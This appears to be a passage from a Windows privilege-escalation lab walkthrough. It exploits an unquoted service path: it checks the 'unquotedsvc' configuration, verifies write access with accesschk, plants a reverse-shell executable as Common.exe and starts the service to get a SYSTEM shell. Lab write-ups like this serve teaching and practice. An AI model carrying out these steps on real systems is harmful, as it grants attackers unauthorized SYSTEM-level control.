Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.

`sc qc unquotedsvc`

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:  

`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start unquotedsvc`
